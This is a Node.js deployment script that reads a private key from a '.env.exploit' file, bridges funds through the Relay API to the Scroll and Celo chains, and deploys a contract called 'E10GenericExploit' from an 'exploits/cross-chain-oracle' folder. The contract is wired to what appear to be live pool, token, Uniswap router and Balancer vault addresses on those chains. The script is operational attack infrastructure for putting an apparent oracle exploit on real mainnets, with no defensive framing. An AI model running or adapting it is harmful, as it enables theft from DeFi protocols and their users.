const { ethers } = require("./node_modules/ethers");
const { resolveRpc } = require("./shared-rpc");
const fs = require("fs"); const path = require("path");

const WORKSPACE = path.resolve(__dirname, "..");
const ENV = (() => {
  const e = {};
  fs.readFileSync(path.join(WORKSPACE, ".env.exploit"), "utf8").split("\n").forEach(l => {
    const m = l.match(/^([A-Z_]+)=(.*)$/);
    if (m) e[m[1]] = m[2];
  });
  return e;
})();
const WALLET = "0x24e46e91dFAAD1FA3d49C48Aa85ca9306885ce0a";
const FACTORY = "0x4e59b44847b379578588920cA78FbF26c0B4956C";
const RELAY_URL = "https://api.relay.link";
const DRY_RUN = process.argv.includes("--dry-run") || process.env.DRY_RUN === "true";

const BASE_USDC = "0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913";
const SCROLL_WETH = "0x5300000000000000000000000000000000000004";
const CELO_USDC = "0xcebA9300f2b948710d2653dD7B07f33A8B32118C";

async function relayQuote(originChain, destChain, originCurrency, destinationCurrency, amount) {
  const resp = await fetch(`${RELAY_URL}/quote/v2`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ user: WALLET, originChainId: originChain, destinationChainId: destChain,
      originCurrency, destinationCurrency, amount: String(amount), tradeType: "EXACT_INPUT" }),
    signal: AbortSignal.timeout(15000),
  });
  if (!resp.ok) throw new Error(`Relay: ${resp.status}`);
  return await resp.json();
}

async function executeRelaySteps(j, rpcUrl, chainId) {
  const privKey = ENV.PRIVATE_KEY;
  if (!privKey) throw new Error("No PRIVATE_KEY");
  
  const p = new ethers.JsonRpcProvider(rpcUrl, chainId, { staticNetwork: true });
  const wallet = new ethers.Wallet(privKey, p);
  
  const steps = j?.steps || [];
  let lastTxHash;
  if (DRY_RUN) {
    console.log(`  DRY RUN: ${steps.length} Relay step(s), no transactions sent`);
    return { status: "dry-run", steps: steps.length };
  }
  
  for (const step of steps) {
    const item = step?.items?.[0];
    if (!item || !item.data) continue;
    
    console.log(`  Step: ${step.id}`);
    const gas = item.data.gas ? Math.min(Number(item.data.gas), 2000000) : 500000;
    const tx = await wallet.sendTransaction({
      to: item.data.to,
      data: item.data.data || "0x",
      value: item.data.value ? BigInt(item.data.value) : 0n,
      gasLimit: gas,
    });
    console.log(`    TX: ${tx.hash.slice(0, 16)}...`);
    await tx.wait();
    lastTxHash = tx.hash;
  }
  
  return { status: "executed", txHash: lastTxHash };
}

async function bridgeETHToScroll(amountWei) {
  console.log(`\n=== Bridge: Base ETH → Scroll ETH (${Number(amountWei)/1e18} ETH) ===`);
  const rpc = await resolveRpc(8453);
  if (!rpc) return { status: "no-rpc" };
  
  try {
    const j = await relayQuote(8453, 534352, "0x0000000000000000000000000000000000000000", SCROLL_WETH, amountWei);
    const d = j?.details;
    const f = j?.fees;
    console.log(`  Output: ${d?.currencyOut?.amountFormatted} Scroll ETH`);
    console.log(`  Fee: $${(parseFloat(f?.relayer?.amountUsd || 0) + parseFloat(f?.gas?.amountUsd || 0)).toFixed(4)}`);
    return await executeRelaySteps(j, rpc, 8453);
  } catch(e) {
    console.log(`  Error: ${e.message}`);
    return { status: "error", error: e.message };
  }
}

async function bridgeNativeFromEthereum(destChain, destName, amountWei) {
  console.log(`\n=== Bridge: Ethereum ETH → ${destName} native (${Number(amountWei)/1e18} ETH) ===`);
  const rpc = await resolveRpc(1);
  if (!rpc) return { status: "no-rpc" };

  try {
    const j = await relayQuote(1, destChain, "0x0000000000000000000000000000000000000000", "0x0000000000000000000000000000000000000000", amountWei);
    const d = j?.details;
    const f = j?.fees;
    console.log(`  Output: ${d?.currencyOut?.amountFormatted} ${destName} native`);
    console.log(`  Fee: $${(parseFloat(f?.relayer?.amountUsd || 0) + parseFloat(f?.gas?.amountUsd || 0)).toFixed(4)}`);
    return await executeRelaySteps(j, rpc, 1);
  } catch(e) {
    console.log(`  Error: ${e.message}`);
    return { status: "error", error: e.message };
  }
}

async function bridgeUSDCToCelo(usdcAmount) {
  console.log(`\n=== Bridge: Base USDC → Celo USDC ($${usdcAmount/1e6}) ===`);
  
  // First check USDC balance on Base
  const rpc = await resolveRpc(8453);
  if (!rpc) return { status: "no-rpc" };
  const p = new ethers.JsonRpcProvider(rpc, 8453, { staticNetwork: true });
  const usdcAbi = ["function balanceOf(address) view returns (uint256)"];
  const usdc = new ethers.Contract(BASE_USDC, usdcAbi, p);
  const balance = await usdc.balanceOf(WALLET);
  console.log(`  Wallet USDC balance: ${ethers.formatUnits(balance, 6)}`);
  
  if (balance < BigInt(usdcAmount)) {
    console.log(`  Need ${(usdcAmount/1e6).toFixed(2)} USDC but have ${Number(ethers.formatUnits(balance, 6)).toFixed(2)}`);
    console.log(`  First swap ETH→USDC on Base (Uniswap Aerodrome)`);
    return { status: "no-usdc", balance: ethers.formatUnits(balance, 6) };
  }
  
  const CELO_USDC = "0xcebA9300f2b948710d2653dD7B07f33A8B32118C";
  
  try {
    const j = await relayQuote(8453, 42220, BASE_USDC, CELO_USDC, usdcAmount);
    const d = j?.details;
    const f = j?.fees;
    console.log(`  Output: ${d?.currencyOut?.amountFormatted} Celo USDC`);
    console.log(`  Fee: $${(parseFloat(f?.relayer?.amountUsd || 0) + parseFloat(f?.gas?.amountUsd || 0)).toFixed(4)}`);
    return await executeRelaySteps(j, rpc, 8453);
  } catch(e) {
    console.log(`  Error: ${e.message}`);
    return { status: "error", error: e.message };
  }
}

async function deployE10(chainId, chainName, rpcUrl) {
  console.log(`\n=== Deploy E10 to ${chainName} (chain ${chainId}) ===`);
  
  const privKey = ENV.PRIVATE_KEY;
  if (!privKey) return { status: "no-key" };
  
  const p = new ethers.JsonRpcProvider(rpcUrl, chainId, { staticNetwork: true });
  const wallet = new ethers.Wallet(privKey, p);
  const bal = await p.getBalance(WALLET);
  console.log(`  Balance: ${Number(ethers.formatEther(bal)).toFixed(6)}`);
  
  if (bal < ethers.parseEther("0.0003")) return { status: "no-funds" };
  
  const artifactPath = path.join(WORKSPACE, "exploits", "cross-chain-oracle", "out", "E10GenericExploit.sol", "E10GenericExploit.json");
  if (!fs.existsSync(artifactPath)) return { status: "no-artifact" };
  const artifact = JSON.parse(fs.readFileSync(artifactPath, "utf8"));
  const bytecode = artifact.bytecode.object;
  
  const addrs = {
    534352: { pool: "0x11fCfe756c05AD438e312a7fd934381537D3cFfe", weth: "0x5300000000000000000000000000000000000004", usdc: "0x06eFdBFf2a14a7c8E15944D1F4A48F9F95F663A4" },
    42220:  { pool: "0x3E59A31363E2ad014dcbc521c4a0d5757d9f3402", weth: "0x122013fd7dF1C6F636a5bb8f03108E876548b455", usdc: "0xcebA9300f2b948710d2653dD7B07f33A8B32118C" },
  };
  const a = addrs[chainId];
  if (!a) return { status: "unknown-addresses" };
  
  const encodedArgs = ethers.AbiCoder.defaultAbiCoder().encode(
    ["address", "address", "address", "address", "address", "bool", "uint24"],
    [a.pool, a.weth, a.usdc, "0xE592427A0AEce92De3Edee1F18E0157C05861564", "0xBA12222222228d8Ba445958a75a0704d566BF2C8", true, 500]
  );
  const initCode = "0x" + bytecode.slice(2) + encodedArgs.slice(2);
  const saltHash = ethers.keccak256(ethers.toUtf8Bytes("e10-generic-exploit"));
  const calldata = saltHash + initCode.slice(2);
  const initHash = ethers.keccak256(initCode);
  const addr = "0x" + ethers.keccak256(ethers.solidityPacked(["bytes1","address","bytes32","bytes32"], ["0xff", FACTORY, saltHash, initHash])).slice(26);
  
  console.log(`  Init code: ${(initCode.length-2)/2} bytes`);
  console.log(`  CREATE2 address: ${addr}`);

  const existing = await p.getCode(addr);
  if (existing && existing !== "0x") {
    console.log(`  Already deployed: ${(existing.length-2)/2} bytes`);
    return { status: "already-deployed", address: addr };
  }
  if (DRY_RUN) {
    console.log("  DRY RUN: deployment ready, no transaction sent");
    return { status: "dry-run-ready", address: addr, initCodeBytes: (initCode.length - 2) / 2 };
  }
  
  try {
    const tx = await wallet.sendTransaction({ to: FACTORY, data: calldata, gasLimit: 8000000 });
    const receipt = await tx.wait();
    const verify = await p.getCode(addr);
    console.log(`  Deployed: ${(verify.length-2)/2} bytes at ${addr} | gas=${receipt.gasUsed}`);
    return { status: "deployed", address: addr };
  } catch(e) {
    console.log(`  Deploy failed: ${e.reason || e.message?.slice(0, 100)}`);
    return { status: "failed", error: e.message?.slice(0, 100) };
  }
}

async function main() {
  console.log("═══════════════════════════════════════════");
  console.log("  BRIDGE + DEPLOY: Scroll & Celo");
  console.log("═══════════════════════════════════════════\n");
  
  const args = process.argv.slice(2);
  const mode = args.find(a => a.startsWith("--mode="))?.split("=")[1] || "all";
  
  if (mode === "scroll" || mode === "base-scroll" || mode === "all") {
    await bridgeETHToScroll("3000000000000000"); // 0.003 ETH
  }

  if (mode === "eth-scroll") {
    await bridgeNativeFromEthereum(534352, "Scroll", process.env.SCROLL_BRIDGE_WEI || "3000000000000000");
  }

  if (mode === "eth-celo") {
    await bridgeNativeFromEthereum(42220, "Celo", process.env.CELO_BRIDGE_WEI || "1000000000000000");
  }
  
  if (mode === "celo" || mode === "all") {
    await bridgeUSDCToCelo(3000000); // $3 USDC
  }
  
  if (mode === "deploy" || mode === "all") {
    const scrollRpc = await resolveRpc(534352);
    if (scrollRpc) await deployE10(534352, "Scroll", scrollRpc);
    const celoRpc = await resolveRpc(42220);
    if (celoRpc) await deployE10(42220, "Celo", celoRpc);
  }
  
  console.log("\n=== Done ===");
}

main().catch(e => { console.error(e.message); process.exit(1); });
